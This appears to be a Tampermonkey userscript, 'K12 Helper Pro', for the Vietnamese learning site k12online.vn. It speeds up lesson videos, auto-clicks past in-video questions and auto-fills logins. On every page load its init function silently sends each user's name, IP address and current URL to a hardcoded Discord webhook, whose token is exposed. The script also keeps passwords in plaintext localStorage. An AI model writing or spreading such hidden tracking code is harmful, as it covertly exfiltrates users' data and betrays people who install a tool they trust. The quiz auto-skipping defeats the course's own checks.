// ==UserScript==
// @name         K12 Helper Pro - Danhvux (Ultimate - Bottom Left Toast & Optimized)
// @namespace    http://tampermonkey.net/
// @version      32.0
// @description  Full Emoji Toast (Bottom-Left), Optimized Tab Width, Sliding Animations
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw'; 

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 350, speed: 1, user: '', pass: '', isDarkMode: true
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- LOGIC TURBO ---
    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button, .btn-confirm-answer').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    // --- KHỞI TẠO SHADOW DOM ---
    const host = document.createElement('div');
    host.id = 'dv-helper-root';
    document.body.appendChild(host);
    const shadow = host.attachShadow({mode: 'open'});

    // --- TOAST NOTIFY (GÓC DƯỚI TRÁI + EMOJI) ---
    const showToast = (message, type = 'info') => {
        let container = shadow.querySelector('#toast-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'toast-container';
            shadow.appendChild(container);
        }
        
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        
        const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        const emoji = emojis[type] || 'ℹ️';

        toast.innerHTML = `<span class="t-emoji">${emoji}</span> <span class="t-msg">${message}</span>`;
        container.appendChild(toast);
        
        setTimeout(() => {
            toast.style.animation = 'toastOut 0.4s forwards';
            setTimeout(() => toast.remove(), 400);
        }, 3000);
    };

    // --- CSS & ANIMATIONS (OPTIMIZED) ---
    const isDark = config.isDarkMode;
    const style = document.createElement('style');
    style.textContent = `
        :host { --mc: ${config.mainColor}; --bg: ${isDark ? '#1e2227' : '#ffffff'}; --text: ${isDark ? '#ffffff' : '#1e2227'}; --border: ${isDark ? '#333' : '#ddd'}; }
        
        #dv-panel { 
            position: fixed; top: 50px; right: 20px; width: ${config.width}px; 
            background: var(--bg); color: var(--text); border-radius: 12px; 
            font-family: 'Segoe UI', Tahoma, sans-serif; z-index: 100000; 
            box-shadow: 0 15px 50px rgba(0,0,0,0.6); overflow: hidden; 
            border: 1px solid var(--border); animation: panelIn 0.4s cubic-bezier(0.1, 0.9, 0.2, 1);
        }
        @keyframes panelIn { from { opacity: 0; transform: translateY(-20px); } }

        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid var(--border); }
        .title { color: var(--mc); font-weight: 800; font-size: 19px; letter-spacing: 0.5px; }
        .red-dot { height: 13px; width: 13px; background: #ff5f56; border-radius: 50%; cursor: pointer; transition: 0.2s; }
        .red-dot:hover { transform: scale(1.2); }

        .tabs { display: flex; background: ${isDark ? '#16191d' : '#f5f5f5'}; border-bottom: 1px solid var(--border); }
        .tab { flex: 1; padding: 14px 0; text-align: center; cursor: pointer; font-size: 11px; font-weight: 900; color: #666; transition: 0.3s; position: relative; }
        .tab.active { color: var(--mc); }
        .tab.active::after { content: ''; position: absolute; bottom: 0; left: 15%; right: 15%; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }

        .body-container { position: relative; min-height: 220px; }
        .content { display: none; padding: 22px; box-sizing: border-box; }
        .content.active { display: block; animation: slideIn 0.35s ease-out; }
        @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        /* Ô Video Đen - Rộng rãi */
        .video-box { width: 100%; height: 150px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; margin-bottom: 18px; border: 1px solid #333; box-shadow: inset 0 0 20px rgba(255,255,255,0.05); }
        .video-box.active { color: var(--mc); border-color: var(--mc); text-shadow: 0 0 10px var(--mc); }

        .btn { width: 100%; padding: 14px; background: #b8cc8e; border: none; border-radius: 12px; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; font-size: 13px; }
        .btn:hover { filter: brightness(1.1); transform: translateY(-2px); box-shadow: 0 4px 12px rgba(184,204,142,0.3); }

        input[type=text], input[type=password] { width: 100%; padding: 12px; background: ${isDark ? '#252a31' : '#f9f9f9'}; border: 1px solid var(--border); color: var(--text); border-radius: 10px; margin-bottom: 12px; box-sizing: border-box; outline: none; }
        input[type=text]:focus { border-color: var(--mc); }

        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .app-item { background: ${isDark ? '#252a31' : '#f0f0f0'}; padding: 12px 5px; border-radius: 10px; text-align: center; font-size: 12px; cursor: pointer; transition: 0.2s; border: 1px solid var(--border); }
        .app-item:hover { border-color: var(--mc); transform: translateY(-3px); color: var(--mc); }

        /* Toasts Bottom Left */
        #toast-container { position: fixed; bottom: 25px; left: 25px; z-index: 1000000; display: flex; flex-direction: column; gap: 12px; pointer-events: none; }
        .toast { 
            pointer-events: auto; background: var(--bg); color: var(--text); padding: 14px 22px; border-radius: 12px; 
            box-shadow: 0 8px 25px rgba(0,0,0,0.5); border-left: 5px solid var(--mc); 
            animation: toastIn 0.5s cubic-bezier(0.1, 0.9, 0.2, 1.2) forwards; 
            display: flex; align-items: center; gap: 12px; min-width: 200px;
        }
        .toast.success { border-left-color: #27c93f; }
        .toast.error { border-left-color: #ff5f56; }
        .toast.warning { border-left-color: #ffbd2e; }
        .t-emoji { font-size: 18px; }
        .t-msg { font-size: 13px; font-weight: 500; }
        @keyframes toastIn { from { opacity: 0; transform: translateX(-100%); } }
        @keyframes toastOut { to { opacity: 0; transform: translateX(-100%); } }
    `;
    shadow.appendChild(style);

    // --- KHỞI TẠO GIAO DIỆN ---
    const init = async () => {
        let userIP = "Đang lấy...";
        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); userIP = data.ip; } catch(e) { userIP = "Ẩn"; }
        const nameEl = document.querySelector('.user-name, .profile-name, .name-user, .username');
        const currentUser = nameEl ? nameEl.innerText.trim() : (config.user || "Khách");

        // Gửi Discord Webhook
        fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({
            embeds: [{ title: "🔥 DANHVUX HELPER LOG", color: 16771840, fields: [{ name: "👤 User", value: currentUser, inline: true }, { name: "🌐 IP", value: userIP, inline: true }, { name: "📍 URL", value: window.location.href }] }]
        }) }).catch(()=>{});

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="red-dot" title="Ẩn (F2 hiện lại)"></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div style="display:flex; justify-content:space-between; margin-bottom:5px;"><b>Tốc độ</b><span style="color:var(--mc); font-weight:bold;">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" style="width:100%; margin:15px 0; accent-color:var(--mc);" min="1" max="20" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 TỰ ĐỘNG ĐĂNG NHẬP</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-box" id="v-display">CHƯA CÓ NGUỒN PHÁT</div>
                    <input type="text" id="v-url" placeholder="Link video (.mp4)...">
                    <button class="btn" id="v-run" style="background:#333; color:#fff">PHÁT VIDEO TÙY CHỈNH</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" onclick="window.open('https://gemini.google.com')">Gemini</div>
                        <div class="app-item" onclick="window.open('https://chatgpt.com')">ChatGPT</div>
                        <div class="app-item" onclick="window.open('https://facebook.com')">Facebook</div>
                        <div class="app-item" onclick="window.open('https://youtube.com')">YouTube</div>
                        <div class="app-item" onclick="window.open('https://tiktok.com')">TikTok</div>
                        <div class="app-item" onclick="window.open('https://messenger.com')">Mess</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <div style="font-size:11px; margin-bottom:8px;">MÀU CHỦ ĐẠO</div>
                    <input type="color" id="c-pick" style="width:100%; height:35px; border:none; cursor:pointer; background:none;" value="${config.mainColor}">
                    <input type="text" id="u-val" placeholder="Tài khoản..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Mật khẩu..." value="${config.pass}">
                    <button class="btn" id="btn-save" style="background:var(--mc)">LƯU CẤU HÌNH</button>
                </div>
            </div>
            <div style="text-align:center; font-size:9px; padding:12px; color:#666; border-top:1px solid var(--border); letter-spacing:0.3px;">
                IP: ${userIP} | USER: ${currentUser}
            </div>
        `;
        shadow.appendChild(panel);

        const $ = (id) => shadow.querySelector(id);

        // Chuyển Tab + Animation
        shadow.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                if(tab.classList.contains('active')) return;
                shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                $(`#${tab.dataset.t}`).classList.add('active');
                showToast(`Đã chuyển sang ${tab.innerText}`, 'info');
            };
        });

        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; runTurbo(); };
        
        $('#btn-save').onclick = () => { 
            config.mainColor = $('#c-pick').value; 
            config.user = $('#u-val').value; 
            config.pass = $('#p-val').value; 
            save(); 
            showToast("Lưu thành công! Đang tải lại...", "success");
            setTimeout(() => location.reload(), 800);
        };
        
        $('#v-run').onclick = () => {
            const v = document.querySelector('video');
            const url = $('#v-url').value;
            if(v && url) {
                v.src = url; v.play();
                $('#v-display').innerText = "ĐANG PHÁT...";
                $('#v-display').classList.add('active');
                showToast("Đang stream video!", "success");
            } else showToast("Không tìm thấy trình phát!", "error");
        };

        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
            if(u && p) {
                u.value = config.user; p.value = config.pass;
                u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true}));
                setTimeout(()=> {
                    const btn = document.querySelector('button[type="submit"]');
                    if(btn) btn.click();
                }, 500);
                showToast("Đang tự động đăng nhập...", "success");
            } else showToast("Hãy vào trang đăng nhập!", "warning");
        };

        // Kéo thả & Phím tắt
        let isDrag = false, off = [0,0];
        shadow.querySelector('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => isDrag = false);
        shadow.querySelector('.red-dot').onclick = () => { panel.style.display = 'none'; showToast("F2 để hiện Panel", "warning"); };
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = (panel.style.display==='none'?'block':'none'); });

        showToast("Hệ thống Danhvux đã sẵn sàng!", "success");
    };

    if (document.readyState === 'complete') init(); else window.addEventListener('load', init);
})();
